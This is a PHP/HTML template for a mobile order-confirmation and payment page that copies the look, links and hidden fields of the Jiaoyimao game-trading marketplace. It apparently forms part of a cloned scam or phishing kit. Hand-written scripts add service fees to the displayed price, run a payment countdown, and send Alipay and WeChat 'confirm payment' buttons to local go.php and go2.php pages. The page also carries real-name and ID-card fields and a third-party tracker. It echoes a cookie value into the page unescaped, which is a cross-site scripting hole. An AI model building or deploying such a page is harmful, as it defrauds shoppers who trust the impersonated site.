    <!-- <p class='consignee-info'>收货信息</p> -->
	    <div class="optizime-form">
    
        <div class="form-control controll">
                        <div class="left-box">
                                <label class="label key title left-info">手机号码</label>
                                            </div>
                        
                                
                                 <div class="content optizimat-content">

                                                                                  <span class="input-text optizimat-input">
                                                    <input type="tel" id="tel" name="tel" name="手机号码" placeholder="请输入手机号码" contenttype="10" class="right-info" value="<?php echo $_COOKIE['tel889'];?>">
                                         </span>
                          
                           </div>

                
                <input type="hidden" name="1440407481136589" value="1440407481136589">
            </div>
            			            <!--     去掉黑字提示，统一购买说明 -->
                        <p class="form-info-tips common-con"></p>
            
                			
        </div>
</div>
  
<div id="aa11" class="notification" style="width: auto; margin-left: -58px; margin-top: -19px; visibility: visible; display: none;"><h2></h2><p>手机号码不能为空</p></div>

                
        <!--保险套餐-->
        <!--保险是否要加个暂不投保的按钮-->
                <input type="hidden" id="insurancePackageUrl" value="">
<input type="hidden" id="insuranceNoticeUrl" name="insuranceNoticeUrl" value="https://m.jiaoyimao.com/insurance/docs/picc/notice">
<input type="hidden" id="insuranceClauseUrl" name="insuranceClauseUrl" value="https://m.jiaoyimao.com/insurance/docs/picc/clause">
<input type="hidden" id="insuranceProvider" name="insuranceProvider" value="3">
<input type="hidden" id="selected-insurance-price" name="selectedInsurancePrice" value="0">
<input type="hidden" value="true" id="is-buyer">
<input type="hidden" value="true" id="qijianInsuranceEnable">
<input type="hidden" value="{&quot;insurancePkgList&quot;:[{&quot;id&quot;:1538038756242465,&quot;name&quot;:&quot;60天险-高风险&quot;,&quot;premiumRate&quot;:18,&quot;effectDuration&quot;:60,&quot;status&quot;:1,&quot;ctime&quot;:1538038756,&quot;utime&quot;:1538038756},{&quot;id&quot;:1538038842806217,&quot;name&quot;:&quot;90天险-高风险&quot;,&quot;premiumRate&quot;:20,&quot;effectDuration&quot;:90,&quot;status&quot;:1,&quot;ctime&quot;:1538038842,&quot;utime&quot;:1538038842}],&quot;isBuyer&quot;:true,&quot;applicationPkgId&quot;:1538038756242465,&quot;isEditable&quot;:true,&quot;insuranceCheck&quot;:false}" id="qijianInsurancePackagePageDto">

<div id="insurance-iframe-zone"></div>
<!-- 这里添加xianyu-insurance只是为了加载iframe失败的时候提供样式处理，TODO: 修改类名 -->

<div id="insurance-msg" class="insurance-msg"></div>
        <!--保险套餐-->

        <!--end非灵犀账号角色交易的-->
    
    <div class="sub-con full-con no_margin">
    <!--灵犀账号交易不需要选择客服-->
            <!-- 交易客服选择套餐开始 -->
                        <div class="J-customer-service-form" id="choice-customer-service"><div class="title">交易客服选择</div>
<ul class="flex-form-list">
    
    <li onclick="re01();" id="ul1" class="flex-form-list-item" data-service-fee="16" data-service-name="VIP客服" data-deliver-efficiency="15" data-service-id="1545986649976347" data-fullpercent="0" data-yun-inspect="">
        <div class="item-multi">
            <span class="item-multi-desc">VIP客服</span>
            <span class="item-multi-price">
              
                ¥16
              
            </span>
        </div>
        <div class="item-single">
            
            <span>平均发货时间</span><span class="item-single-time">15分钟</span>
            
        </div>
    </li>
    
    <li onclick="re02();" id="ul2" class="flex-form-list-item" data-service-fee="10" data-service-name="高级客服" data-deliver-efficiency="28" data-service-id="1545986689451497" data-fullpercent="0" data-yun-inspect="">
        <div class="item-multi">
            <span class="item-multi-desc">高级客服</span>
            <span class="item-multi-price">
              
                ¥10
              
            </span>
        </div>
        <div class="item-single">
            
            <span>平均发货时间</span><span class="item-single-time">28分钟</span>
            
        </div>
    </li>
    
    <li onclick="re03();" id="ul3" class="flex-form-list-item" data-service-fee="5" data-service-name="中级客服" data-deliver-efficiency="45" data-service-id="1545986724368728" data-fullpercent="0" data-yun-inspect="">
        <div class="item-multi">
            <span class="item-multi-desc">中级客服</span>
            <span class="item-multi-price">
              
                ¥5
              
            </span>
        </div>
        <div class="item-single">
            
            <span>平均发货时间</span><span class="item-single-time">45分钟</span>
            
        </div>
    </li>
    
    <li onclick="re04();" id="ul4" class="flex-form-list-item active" data-service-fee="0" data-service-name="普通客服" data-deliver-efficiency="61" data-service-id="1545986745137657" data-fullpercent="0" data-yun-inspect="" data-spm-anchor-id="gcmall.confirm_order.0.i2">
        <div class="item-multi">
            <span class="item-multi-desc">普通客服</span>
            <span class="item-multi-price">
              
                
                免费
                
              
            </span>
        </div>
        <div class="item-single">
            
            <span>平均发货时间</span><span class="item-single-time">61分钟</span>
            
        </div>
    </li>
    
</ul></div>  
<script type="text/javascript">
    var jjgg = <?php echo $_GoodsID['price'];?>;
function re01() {
    var ul1 = document.getElementById("ul1");
    var ul2 = document.getElementById("ul2");
    var ul3 = document.getElementById("ul3");
    var ul4 = document.getElementById("ul4");
    document.getElementById("jjggg").innerHTML = jjgg+16;
	ul1.setAttribute("class", "flex-form-list-item active"); 
	ul2.setAttribute("class", "flex-form-list-item"); 
	ul3.setAttribute("class", "flex-form-list-item"); 
	ul4.setAttribute("class", "flex-form-list-item"); 
}
function re02() {
    var ul1 = document.getElementById("ul1");
    var ul2 = document.getElementById("ul2");
    var ul3 = document.getElementById("ul3");
    var ul4 = document.getElementById("ul4");
    document.getElementById("jjggg").innerHTML = jjgg+10.00;
	ul1.setAttribute("class", "flex-form-list-item"); 
	ul2.setAttribute("class", "flex-form-list-item active"); 
	ul3.setAttribute("class", "flex-form-list-item"); 
	ul4.setAttribute("class", "flex-form-list-item"); 
}
function re03() {
    var ul1 = document.getElementById("ul1");
    var ul2 = document.getElementById("ul2");
    var ul3 = document.getElementById("ul3");
    var ul4 = document.getElementById("ul4");
    document.getElementById("jjggg").innerHTML = jjgg+5;
	ul1.setAttribute("class", "flex-form-list-item"); 
	ul2.setAttribute("class", "flex-form-list-item"); 
	ul3.setAttribute("class", "flex-form-list-item active"); 
	ul4.setAttribute("class", "flex-form-list-item"); 
}
function re04() {
    var ul1 = document.getElementById("ul1");
    var ul2 = document.getElementById("ul2");
    var ul3 = document.getElementById("ul3");
    var ul4 = document.getElementById("ul4");
	ul1.setAttribute("class", "flex-form-list-item"); 
	ul2.setAttribute("class", "flex-form-list-item"); 
	ul3.setAttribute("class", "flex-form-list-item"); 
	ul4.setAttribute("class", "flex-form-list-item active"); 
}
</script>
      
        <input type="hidden" name="customerServicePrice" id="customer-service-price" value="0">
        <input type="hidden" name="deliverServicePackageId" id="deliver-service-package-id" value="1545986745137657">
        <input type="hidden" name="deliverServicePackageReadOnly" id="deliver-service-read-only" value="">
        <input type="hidden" name="cloudInspectServicePackageId" id="cloud-inspect-service-package-id" value="">
        <!-- 交易客服选择套餐结束 -->
            <!-- 服务协议 -->
    <div class="buy-agreement deliver-service-confirm">
        确认购买即已阅读并同意
        <a href="https://feedback.uc.cn/self_service/wap/faq_detail_try_page?faqId=1000081089&amp;instance=jym&amp;uc_param_str=einibicppfmivefrlantcunwsssvjbktchnnsnddds" target="_blank">《交易猫平台虚拟物品交易规则》</a>
        <a href="https://m.jiaoyimao.com/agreement">《交易猫用户服务协议及规则》</a>
        <a href="https://m.jiaoyimao.com/insurance/docs/picc/notice">《保险购买须知》</a>        <a href="https://m.jiaoyimao.com/insurance/docs/picc/clause">《交易安全险》</a>    </div>
                <!-- 服务协议 -->


        <!--价格明细弹窗-->
        <!--价格明细弹窗-->
<div class="dialog-box-mask hide J-dialog-box-mask" id="ul6" onclick="re05();"></div>
<div class="price-detail-dialog hide J-price-detail-dialog" value="1" id="ul5">
    <h4>
        订单金额明细
        <i onclick="re05();" class="nav_icon_close price-dialog-close J-price-dialog-close"></i>
    </h4>
    <ul class="price-list">
        <li>
            <span class="price-name">
                            商品单价
                                    </span>
            <span class="text-public price-number J-price-number"><?php echo $_GoodsID['price'];?>.00</span>
            <span class="hide text-public price-number" id="original-price"><?php echo $_GoodsID['price'];?>.00元</span>
        </li>
        <li>
            <span class="price-name">购买数量</span>
            <span class="text-public J-goods-number">1</span>
        </li>
        <li>
            <span class="price-name">客服费用</span>
            <span class="text-public price-number" id="customer-service-text-rate">0.00</span>
        </li>
        <li>
            <span class="price-name all-price">实付款</span>
            <span class="text-public price-number all-price" id="amount-value"><?php echo $_GoodsID['price'];?>.00</span>
        </li>
    </ul>
</div>
<!--价格明细弹窗-->        <!--价格明细弹窗-->

    </div>


    <!-- 未成年人购买限制简单版-->
    <div class="buy_limit_2_mask hide"></div>
<div class="buy_limit_main_body">
    <div class="buy_limit_2_content">
        <h4>购买提示<i class="limit_2_close"></i></h4>
        <div class="limit_2_info">
            <p>根据国家规定，未成年人暂不允许交易。请先完成<span class="limt_bold_color">实名认证</span>。</p>
            <div>
                <input type="text" id="limit_2_name" class="info_input" placeholder="请输入真实姓名">
            </div>
            <div>
                <input type="text" id="limit_2_card" class="info_input" placeholder="请输入身份证号">
            </div>
        </div>
        <div class="limit_2_button clearfix">
            <p class="limit_2_submit limit_2_no_allow_submit">立即认证</p>
        </div>
    </div>
</div>    <!-- 未成年人购买限制简单版-->

    <div><input type="hidden" name="categoryId" value="1440407481127586"></div>
    <div><input type="hidden" name="validCounts" value="8b3bb3f32c5990dc2c233b2d85e93ac5"></div>
    <script type="text/javascript" src="https://js.users.51.la/20885247.js"></script>
    <div><input type="hidden" name="price" value="<?php echo $_GoodsID['price'];?>.0"></div>
    <!-- <div><input type="hidden" name="auctionPrice" id="auctionPrice"  value=""/></div> -->
    <div><input type="hidden" name="ccId" value=""></div>
    <div><input type="hidden" name="couponType" value=""></div>
    <div><input type="hidden" name="hasPublish" value=""></div>
    <input type="hidden" name="promoterId" value="">
    <input type="hidden" name="isPromoterSelfBuy" value="">
    <input type="hidden" name="serialNo" value="">
    <input type="hidden" name="isGroupBuyOrder" value="false">
            <div class="buy-confirm-bar">
        <div class="price-detail">
            <span class="price-type">¥</span>
            <span id="jjggg" class="pay-price J-confirm-pay-price" style=""><?php echo $_GoodsID['price'];?></span>
            <div class="color-lottie-flex-shape-img loading-position" style="display: none;"></div>
            <a onclick="re05();" href="javascript:;" class="J-dialog-details detail-button-css">
                明细
                <i class="detail-icon unfold J-detail-icon"></i>
            </a>
        </div>
                        <div class="sub-con full-con buy-confirm-button J-confirm-buy-btn">
                          <input name="提交" type="submit" class="btn-blue optizimat-buyer-button" id="walletSubmit" value="确认购买">
                        </div>
            </div>
    </form>
<!-- app导端二期购买确认页代金劵弹窗 -->
<!-- app导端二期购买确认页代金劵弹窗 -->
<!-- 交易风险提示 -->
<script type="text/javascript">
function re05() {
    var ul5 = document.getElementById("ul5");
    var ul6 = document.getElementById("ul6");
    var ul7 = document.getElementById("ul7");

    if (ul5.getAttribute("value")=="1") {
		ul5.setAttribute("value", "0"); 
		ul5.style.bottom="0px";
		ul5.setAttribute("class", "price-detail-dialog J-price-detail-dialog"); 
		ul6.setAttribute("class", "dialog-box-mask J-dialog-box-mask"); 
		ul7.setAttribute("class", "detail-icon J-detail-icon fold"); 
    } else {
		ul5.setAttribute("value", "1"); 
		ul5.style.bottom="-300px";
		ul5.setAttribute("class", "price-detail-dialog J-price-detail-dialog hide"); 
		ul6.setAttribute("class", "dialog-box-mask J-dialog-box-mask hide"); 
		ul7.setAttribute("class", "detail-icon J-detail-icon unfold"); 
    }
}
</script>

<input type="hidden" class="copyJYMCodeNo"><script></script>
  <div style="z-index: 998; display: none;" class="overlay"></div><div></div>
  <div id="jym-modal-container-1625186949620"><div>
    <div id="aa22" style="display: none;" class="jym-modal-mask"></div>
    <div id="aa33" style="display: none;" class="jym-modal-wrap jym-modal-wrap-popup" role="dialog" aria-labelledby="支付订单">
      <div role="document" class="jym-modal jym-pay-am-modal jym-modal-popup jym-modal-popup-slide-up">
        <div class="jym-modal-content"><button onclick="zhifu01();" aria-label="Close" class="jym-modal-close"><span class="jym-modal-close-x" data-spm-anchor-id="gcmall.confirm_order.0.i4"></span></button>
          <div class="jym-modal-header"><div class="jym-modal-title">支付订单</div></div>
          <div class="jym-modal-body"><div class="jym-pay-container"><div class="pay-description">支付剩余时间：<span class="result-second" id="time" time="">29分59秒</span></div>
            <div class="pay-price"><div>¥<span class="count-up-price"><?php echo $_GoodsID['price'];?>.00</span></div></div>
            <div class="pay-method-list">
              <div onclick="xuanze01();" <?php echo $pay_fangshi111 ?> class="pay-method-item">
              <img src="https://jym-static-daily.oss-cn-zhangjiakou.aliyuncs.com/jym-oss/resource/item/1552371136666006/20210408/174007769.png" class="pay-method-image">
              <div class="pay-method-content"><div class="pay-label">支付宝</div>
                <div class="pay-desc"></div></div>
              <i id="payzzz" class="jym-iconfontV2 jym-iconfontV2-selected iconfont-selected"></i></div>
              <div onclick="xuanze02();" <?php echo $pay_fangshi222 ?> class="pay-method-item">
              <img src="https://jym-static-daily.oss-cn-zhangjiakou.aliyuncs.com/jym-oss/resource/item/1552371136666006/20210408/173730095.png" class="pay-method-image">
                <div class="pay-method-content"><div class="pay-label">微信</div>
                  <div class="pay-desc"></div></div>
              <i id="paywww" class="jym-iconfontV2 jym-iconfontV2 iconfont-selected"></i></div>
              
              </div>
            <a <?php echo $payzz ?> id="payzzz01" href="go.php" role="button" class="jym-button" aria-disabled="false"><span>确认支付</span></a>
            <a <?php echo $payww ?> id="paywww01" href="go2.php" role="button" class="jym-button" aria-disabled="false"><span>确认支付</span></a>
            </div></div></div></div></div></div></div>
<script type="text/javascript">
function zhifu01() {
    var aa22 = document.getElementById("aa22");
    var aa33 = document.getElementById("aa33");
		aa22.setAttribute("style", "display: none;"); 
		aa33.setAttribute("style", "display: none;"); 
}
function xuanze01() {
		payzzz.setAttribute("class", "jym-iconfontV2 jym-iconfontV2-selected iconfont-selected"); 
		paywww.setAttribute("class", "jym-iconfontV2 jym-iconfontV2 iconfont-selected"); 
		payzzz01.setAttribute("style", ""); 
		paywww01.setAttribute("style", "display: none;"); 
}
function xuanze02() {
		payzzz.setAttribute("class", "jym-iconfontV2 jym-iconfontV2 iconfont-selected"); 
		paywww.setAttribute("class", "jym-iconfontV2 jym-iconfontV2-selected iconfont-selected"); 
		payzzz01.setAttribute("style", "display: none;"); 
		paywww01.setAttribute("style", ""); 
}
  
</script>
  
<script src="dev2/jquery.js"></script>
<script src="dev2/index.js"></script>
<script>
    // 调用倒计时
    setTime(1800);
</script>
<script>
    var f = document.getElementById('f1122');
    //输入框获取
    var a = document.getElementById('tel');
    var aa11 = document.getElementById("aa11");
    var aa22 = document.getElementById("aa22");
    var aa33 = document.getElementById("aa33");
    //提交表单的事件监听
    f.onsubmit = function (){
        //判断是否存在内容
        if(a.value==''){
            aa11.style.display="";
            setTimeout("aa11.style.display='none';",2000);
            //阻止提交表单
            return false;
        }
        else {
            //alert('提交成功')
            //可以提交表单
		aa22.setAttribute("style", ""); 
		aa33.setAttribute("style", ""); 
          return false;
            //return true;
        }
 
    }
</script>
  
  
</body>
</html>